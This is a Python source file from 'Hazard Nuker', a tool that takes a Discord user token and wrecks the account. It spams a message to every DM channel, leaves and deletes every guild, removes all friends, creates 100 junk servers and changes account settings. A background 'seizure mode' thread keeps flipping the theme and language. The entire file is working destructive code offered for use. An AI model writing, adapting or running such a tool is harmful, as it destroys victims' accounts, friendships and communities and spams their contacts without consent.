# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import threading
import requests
import json
import Hazard
import random

from itertools import cycle
from colorama import Fore

from util.plugins.common import print_slow, setTitle, getheaders

def Hazard_Nuke(token, Server_Name, message_Content):
    setTitle("Deploying Hazardous Nuke")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Hazard Nuke Deployed. . .")
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
            headers=headers,
            data={"content": f"{message_Content}"})
            setTitle(f"Messaging "+channel['id'])
            print(f"{Fore.RED}Messaged ID: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.RED}Sent a Message to all available friends.{Fore.RESET}\n")
    
    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'],
                headers=getheaders(token))
            setTitle(f"Leaving guild: "+guild['name'])
            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
            
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=getheaders(token))
            setTitle(f"Deleting guild: "+guild['name'])
            print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.YELLOW}Deleted/Left all available guilds.{Fore.RESET}\n")

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
            setTitle(f"Removing friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
            print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.GREEN}Removed all available friends.{Fore.RESET}\n")
    
    for i in range(100):
        try:
            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v9/guilds', headers=getheaders(token), json=payload)
            setTitle(f"Creating {Server_Name} #{i}")
            print(f"{Fore.BLUE}Created {Server_Name} #{i}.{Fore.RESET}")
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.BLUE}Created all servers.{Fore.RESET}\n")
    t.do_run = False
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    setTitle(f"Hazard Nuke Successfully Detonated!")
    print_slow(f"{Fore.LIGHTGREEN_EX}Succesfully turned {a} into a Hazardous Wasteland ")
    print("Enter anything to continue. . . ", end="")
    input()
    Hazard.main()

def CustomSeizure(token):
    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        #cycle between light/dark mode and languages
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)